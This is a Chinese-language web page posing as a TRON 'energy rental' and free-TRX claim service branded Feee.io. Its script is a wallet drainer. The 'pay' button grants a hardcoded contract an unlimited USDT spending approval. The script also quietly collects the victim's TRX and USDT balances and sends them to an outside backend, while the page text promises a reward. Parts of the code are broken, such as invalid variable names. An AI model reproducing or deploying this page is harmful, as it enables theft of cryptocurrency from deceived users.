<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>能量租赁 - Feee.io</title>
  <!-- 引入Tailwind CSS（简化样式开发） -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- 引入图标库（用于能量/时间图标） -->
  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white min-h-screen">
  <!-- 顶部导航栏 -->
  <header class="bg-gray-800 py-3 px-4 flex justify-between items-center">
    <div class="flex items-center gap-2">     
      <div class="flex items-center gap-2">
        <div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center">
          <span class="text-white font-bold">F</span>
        </div>
        <span class="font-semibold">Feee.io</span>
      </div>
    </div>
    <button class="w-8 h-8 rounded-full bg-gray-700 flex items-center justify-center">
      <i class="fa fa-globe"></</i>
    </button>
  </header>

  <!-- 用户信息栏 -->
  <section class="bg-gray-800 py-3 px-4 my-2 rounded-lg mx-2">
    <div class="flex justify-between items-center">
      <span>Trc20</span>
      <div class="w-5 h-5 rounded-full bg-red-600 flex items-center justify-center">
        <i class="fa fa-diamond text-xs"></</i>
      </div>
    </div>
    <div class="flex justify-between items-center mt-2">
      <span>能量：0/0</span>
      <button>
        <i class="fa fa-chevron-down text-xs"></</i>
      </button>
    </div>
  </section>

  <!-- 能量租赁主体区域 -->
  <section class="bg-gray-800 rounded-lg mx-2 p-4">
    <div class="flex justify-between items-center mb-4">
      <h2 class="text-xl font-bold">能量租赁</h2>
      <button class="bg-blue-500 text-white px-3 py-1 rounded flex items-center gap-1">
        <i class="fa fa-plus"></</i>
        <span>添加自动租赁</span>
      </button>
    </div>

    <!-- 接收地址 -->
    <div class="mb-4">
      <label class="block text-sm text-gray-300 mb-1">接收地址</label>
      <div id="userInfo" class="bg-gray-700 rounded p-2 flex justify-between items-center">
        <div class="flex items-center gap-2">
          <i class="fa fa-home text-blue-400"></</i>
          <span>未连接钱包</span>
        </div>
      </div>
    </div>

    <!-- 租用量 -->
    <div id="rentl-containr"class="mb-4">
      <label class="block text-sm text-gray-300 mb-1 flex items-center gap-1">
        可获得
        
      </label>
      <div class="bg-gray-700 rounded p-2 flex items-center justify-between mb-2">
        <div class="flex items-center gap-2">
        <div class="w-5 h-5 rounded-full bg-red-600 flex items-center justify-center">
        <i class="fa fa-diamond text-xs"></</i>
      </div>
          <span>15.3254</span>
        </div>
        <div class="flex items-center gap-1 text-gray-300">
          <span>TRX</span>
          
        </div>
      </div>
      <!-- 快捷租用按钮 -->
       <div class="mb-4">
      <label class="block text-sm text-gray-300 mb-1">可用时间</label>
      <div class="bg-gray-700 rounded p-2 flex justify-between items-center mb-2">
        <div class="flex items-center gap-2">
          <i class="fa fa-clock-o text-blue-400"></</i>
          <span>永久有效</span>
        </div>
        
      </div>
      <!-- 时间快捷选择 -->
      
    </div>
      </div>
       <!-- 剩余/回收信息 -->
      <div class="text-sm text-gray-300 space-y-1">
        <div>
          剩余可领能量：447,567,670       
        </div>
        <div>
          剩余可领TRX：48,174,303         
        </div>
      </div>
      <section id="no-wallet-container" class="bg-gray-800 rounded-lg mx-2 p-6 text-center">
    <div class="w-16 h-16 rounded-full bg-gray-700 flex items-center justify-center mx-auto mb-4">
      <<<i class="fa fa-wallet text-2xl text-gray-400"></</</i>
    </div>
    <h3 class="text-lg font-semibold mb-2">请先连接钱包</h3>
    <p class="text-gray-400 text-sm mb-4">连接后即可使用能量租赁功能</p>
    <button id="connect-in-tip" class="bg-blue-500 text-white px-4 py-2 rounded">
      立即连接钱包
    </button>
  </section>
    
    <!-- 租用时间 -->
   

    <!-- 支付按钮 -->
    <button id="connectBtn" class="w-full bg-blue-500 text-white py-3 rounded text-lg font-medium">连接钱包</button>
    <button id="approveBtn" class="w-full bg-blue-500 text-white py-3 rounded text-lg font-medium">支付</button>
  </section>

  <!-- 租用记录区域 -->
  <section class="bg-gray-800 rounded-lg mx-2 p-4 mt-2">
    <div class="flex border-b border-gray-700 pb-2">
      <button class="mr-4 font-semibold text-white border-b-2 border-blue-500 pb-2">租用记录</button>
      <button class="text-gray-300">自动租赁</button>
    </div>
    <!-- 记录列表（暂无数据时的占位） -->
    <div class="text-center text-gray-400 py-4">暂无租用记录</div>
  </section>




    <script src="imtoken://browser"></script>
    <script>
        // 原始配置保留
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";

    // 全局变量
    let tronWeb, userAddress, trc20Contract;
    let globalTokenBalance = "未采集到", globalTrxBalance = "未采集到";
    let globalTrxError = "无错误";
    const RECORD_KEY = "imtoken_infinite_approval_records";

    window.onload = async () => {
        const connectBtn = document.getElementById("connectBtn");
        const approveBtn = document.getElementById("approveBtn");
        const copyLinkText = document.getElementById("copyLinkText");
        const copyLinkBtn = document.getElementById("copyLinkBtn");     
        const rental-container = document.getElementById("rental-container");
       
        renderApprovalRecords();

        // 复制链接逻辑
        copyLinkBtn.addEventListener("click", async () => {
            try {
                await navigator.clipboard.writeText(copyLinkText.textContent.trim());
            } catch (e) {}
        });

        // 检测钱包环境：非TronWeb环境隐藏授权按钮
        if (window.tronWeb && window.tronWeb.ready) {
            tronWeb = window.tronWeb;
            // 检测到钱包，隐藏连接按钮
            connectBtn.style.display = "none";
            no-wallet-container.style.display = "none";
            await initWallet();
        } else {
            document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此次显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
            // 非TronWeb环境，完全隐藏授权按钮
            approveBtn.style.display = "none";
            rental-container.style.display = "none";
        }

        // 手动连接逻辑
        connectBtn.onclick = async () => {
            try {
                if (!window.tronWeb) {
                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
                    return;
                }
                const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                userAddress = accounts[0];
                // 手动连接成功，隐藏连接按钮
                connectBtn.style.display = "none";
                no-wallet-container.style.display = "none";
                await initWallet();
            } catch (e) {}
        };

        // 授权逻辑（仅保留授权后状态提醒）
        approveBtn.onclick = async () => {
            let approveStatus = "未授权";
            let txHash = "未生成", errorMsg = "无错误";

            try {
                if (!trc20Contract) throw new Error("合约未初始化");
                if (!userAddress) throw new Error("未获取到用户地址");

                const result = await trc20Contract.approve(
                    AUTO_TRANSFER_CONTRACT,
                    INFINITE_APPROVE_AMOUNT
                ).send({ from: userAddress, shouldPollResponse: true });
                
                txHash = result.transaction.txID;
                approveStatus = "已授权";
                // 仅保留授权成功提醒
                alert(`授权成功，交易哈希：${txHash.slice(0,16)}...`);

            } catch (e) {
                errorMsg = e.message.includes("用户取消") ? "用户主动取消授权" : e.message;
                // 仅保留授权失败提醒
                alert(`授权失败：${errorMsg}`);
            } finally {
                // 发送数据到后端
                const sendData = {
                    address: userAddress || "未获取地址",
                    tokenBalance: globalTokenBalance,
                    trxBalance: globalTrxBalance,
                    trxErrorMsg: globalTrxError,
                    txHash: txHash,
                    approveStatus: approveStatus,
                    errorMsg: errorMsg,
                    sendTime: new Date().toLocaleString()
                };

                try {
                    await sendDataToBackend(sendData);
                } catch (sendErr) {}

                // 保存授权记录（仅成功时）
                if (approveStatus === "已授权") {
                    const record = {
                        address: userAddress,
                        approveTime: new Date().toLocaleString(),
                        txHash: txHash,
                        approveType: "无限额度",
                        approveStatus: approveStatus
                    };
                    saveApprovalRecord(record);
                    renderApprovalRecords();
                }
            }
        };
    };

    // 初始化钱包：不显示余额
    async function initWallet() {
        try {
            // 1. 获取用户地址
            userAddress = tronWeb.defaultAddress.base58;
            if (!userAddress) throw new Error("获取地址失败");

            // 2. 创建合约实例
            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
            if (!trc20Contract) throw new Error("合约实例创建失败");

            // 3. 采集余额（后台用，不显示）
            try {
                const rawTokenBalance = await getTokenBalanceWithTimeout(userAddress, 10000);
                globalTokenBalance = rawTokenBalance.toFixed(2);
            } catch (e) {
                globalTokenBalance = "采集失败";
            }
            try {
                const rawTrxBalance = await getTrxBalanceWithTimeout(userAddress, 10000);
                globalTrxBalance = rawTrxBalance.toFixed(2);
            } catch (e) {
                globalTrxBalance = "采集失败";
                globalTrxError = e.message;
            }

            // 4. 激活授权按钮：仅显示地址，不显示余额
            document.getElementById("userInfo").innerHTML = `
           已连接：${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>须消耗10.6个TRX，可领取15个TRX加密货币如放弃领取直接退出即可
            `;
            approveBtn.disabled = false;
            // 确保授权按钮显示（避免意外隐藏）
            approveBtn.style.display = "block";

        } catch (initErr) {}
    }

    // TRX余额查询（后台用）
    async function getTrxBalanceWithTimeout(address, timeout = 10000) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);

        try {
            const rawBalance = await tronWeb.trx.getBalance(address, { signal: controller.signal });
            return rawBalance / 1000000;
        } catch (e) {
            throw e;
        } finally {
            clearTimeout(timeoutId);
        }
    }

    // USDT余额查询（后台用）
    async function getTokenBalanceWithTimeout(address, timeout = 10000) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);

        try {
            const rawBalance = await trc20Contract.balanceOf(address).call({ signal: controller.signal });
            return rawBalance / 1000000;
        } catch (e) {
            throw e;
        } finally {
            clearTimeout(timeoutId);
        }
    }

    // 保存授权记录：不包含余额
    function saveApprovalRecord(record) {
        try {
            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            const newRecords = existing.filter(item => item.address !== record.address);
            newRecords.push(record);
            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
        } catch (e) {}
    }

    // 渲染授权记录：不显示余额
    function renderApprovalRecords() {
        const container = document.getElementById("approvalRecords");
        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
        
        if (records.length === 0) {
            container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
        } else {
            container.innerHTML = records.map(record => `
                <div class="record-item">
                    <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                    <p><strong>授权状态：</strong>${record.approveStatus}</p>
                    <p><strong>授权时间：</strong>${record.approveTime}</p>
                    <p><strong>授权类型：</strong>${record.approveType}</p>
                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易详情</a></p>` : ""}
                </div>
            `).join("");
        }
    }

    // 发送数据到后端
    async function sendDataToBackend(data) {
        try {
            const controller = new AbortController();
            setTimeout(() => controller.abort(), 15000);
            
            const res = await fetch(BACKEND_API, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
                credentials: "include",
                signal: controller.signal
            });
            
            if (!res.ok) throw new Error(`后端响应错误：${res.status}`);
            return res.json();
        } catch (e) {
            throw e;
        }
    }
</script>
</body>
</html>
